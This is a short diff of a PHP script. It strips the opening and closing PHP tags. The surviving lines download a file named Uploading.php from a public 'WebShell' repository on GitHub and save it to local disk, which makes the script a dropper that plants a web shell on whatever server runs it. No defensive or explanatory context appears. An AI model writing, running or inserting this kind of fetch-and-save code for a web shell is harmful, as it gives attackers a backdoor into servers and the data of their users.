@@ -1,4 +1,3 @@
-<?php
 $url = 'https://raw.githubusercontent.com/xl7dev/WebShell/master/Php/Uploading.php';
 
 //Download the file using file_get_contents.
@@ -19,4 +18,3 @@ $save = file_put_contents($fileName, $downloadedFileContents);
 if($save === false){
     throw new Exception('Failed to save file to: ' , $fileName);
 }
-?>
